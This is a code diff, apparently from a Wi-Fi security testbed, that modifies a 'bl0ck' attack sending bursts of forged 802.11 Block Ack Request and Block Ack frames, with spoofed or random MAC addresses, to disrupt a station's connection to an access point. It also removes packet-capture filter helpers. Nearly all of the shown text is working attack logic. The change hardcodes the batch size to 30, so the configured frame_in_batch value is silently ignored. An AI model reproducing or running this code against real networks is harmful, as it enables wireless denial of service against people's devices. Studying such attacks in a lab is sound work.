@@ -80,7 +80,7 @@ static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface
 	}, iface, filter, seconds(timeout_sec));
 }
 
-void block(const string &STA_mac, const string &AP_mac, const string &iface, const int frame_in_batch,
+void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_hw, const string &iface, const int frame_in_batch,
 			const string &attack_type, const int duration_sec, const bool is_random
 ){
 	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
@@ -88,18 +88,17 @@ void block(const string &STA_mac, const string &AP_mac, const string &iface, con
 	log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);
 
 	const NetworkInterface iface_obj(iface);
-	const HWAddress<6> ap_hw(AP_mac);
 	PacketSender sender;
 
 	log(LogLevel::INFO, "Sending frames - Duration: {} sec, Concurrent frames: {}", duration_sec, frame_in_batch);
 
 	BARSContext bars_ctx;
+
 	// ReSharper disable once CppTooWideScope // if in BARS if, join after emplace
 	optional<jthread> sniffer_thread;
 	if(attack_type == "BARS"){
-		const HWAddress<6> sta_hw(STA_mac);
 		sniffer_thread.emplace([&]{
-			bars_sniffer_thread(sta_hw, iface, bars_ctx, duration_sec);
+			bars_sniffer_thread(sta_mac, iface, bars_ctx, duration_sec);
 		});
 	}
 
@@ -111,7 +110,7 @@ void block(const string &STA_mac, const string &AP_mac, const string &iface, con
 		try{
 			const HWAddress<6> sta_hw = is_random
 										? HWAddress < 6 > (hw_capabilities::rand_mac())
-										: HWAddress < 6 > (STA_mac);
+										: sta_mac;
 			RadioTap block_frame;
 
 			if(attack_type == "BAR") block_frame = get_BAR_frame(ap_hw, sta_hw);
@@ -120,7 +119,8 @@ void block(const string &STA_mac, const string &AP_mac, const string &iface, con
 				block_frame = get_BAR_frame(ap_hw, sta_hw, bars_ctx.current_fn.load(), bars_ctx.current_sn.load());
 
 			log(LogLevel::DEBUG, "Sending batch {}", iteration);
-			for(int i = 0; i < frame_in_batch; ++i) sender.send(block_frame, iface_obj);
+			for(int i = 0; i < 30; ++i)
+				sender.send(block_frame, iface_obj);
 			this_thread::sleep_for(100ms);
 			iteration++;
 		} catch(const exception &e){
@@ -129,45 +129,6 @@ void block(const string &STA_mac, const string &AP_mac, const string &iface, con
 		}
 	}
 	log(LogLevel::INFO, "Block attack completed after {} iterations", iteration);
-}
-
-static string bpf_mac_at(const int offset, const string &mac){
-	// BPF cant filter 6 bytes at one filters
-	array<unsigned, 6> b{};
-	const char *p = mac.c_str();
-	for(auto &byte : b){
-		char *end;
-		byte = strtoul(p, &end, 16);
-		p = (*end == ':') ? end + 1 : end;
-	}
-	char buf[128];
-	snprintf(buf, sizeof(buf), "(wlan[%d:4] == 0x%02x%02x%02x%02x and wlan[%d:2] == 0x%02x%02x)", offset, b[0], b[1],
-			b[2], b[3], offset + 4, b[4], b[5]);
-	return {buf};
-}
-
-static string bpf_mac_ra_or_ta(const string &mac){
-	// offset 4 -> receiver address
-	// offset 10 -> transmitter address
-	return "(" + bpf_mac_at(4, mac) + " or " + bpf_mac_at(10, mac) + ")";
-}
-
-void speed_observation_start(RunStatus &rs){
-	const string c_mac = rs.get_actor("client")["mac"];
-	const string a_mac = rs.get_actor("attacker")["mac"];
-	const string ap_mac = rs.get_actor("access_point")["mac"];
-
-	const string mac_filter = "((wlan host " + c_mac + " or wlan host " + a_mac + " or wlan host " + ap_mac + ")"
-			" and ((wlan[0] & 0xfc) == 0x88" // QoS Data
-			" or (wlan[0] & 0xfc) == 0xd0))" // Action (ADDBA)
-			// BAR/BA — MAC filters without offset
-			" or ((wlan[0] & 0xfc) == 0x84 and (" + bpf_mac_ra_or_ta(c_mac) + " or " + bpf_mac_ra_or_ta(a_mac) + " or "
-			+ bpf_mac_ra_or_ta(ap_mac) + "))" + " or ((wlan[0] & 0xfc) == 0x94 and (" + bpf_mac_ra_or_ta(c_mac) + " or "
-			+ bpf_mac_ra_or_ta(a_mac) + " or " + bpf_mac_ra_or_ta(ap_mac) + "))";
-
-	observer::tshark::start_tshark(rs, "attacker", mac_filter);
-	observer::tshark::start_tshark(rs, "client", mac_filter);
-	rs.start_observers();
 }
 
 static Bl0ckResult compute_result(const RunStatus &rs){
@@ -238,7 +199,7 @@ void run_bl0ck_attack(RunStatus &rs){
 	const int frame_in_batch = att_cfg.at("frame_in_batch").get<int>();
 	const bool is_random = att_cfg.at("random").get<bool>();
 
-	speed_observation_start(rs);
+	rs.start_observers();
 
 	log(LogLevel::INFO, "Block Attack START (Type: {}, Frames: {})", bl0ck_att_type, frame_in_batch);
 	this_thread::sleep_for(seconds(5));
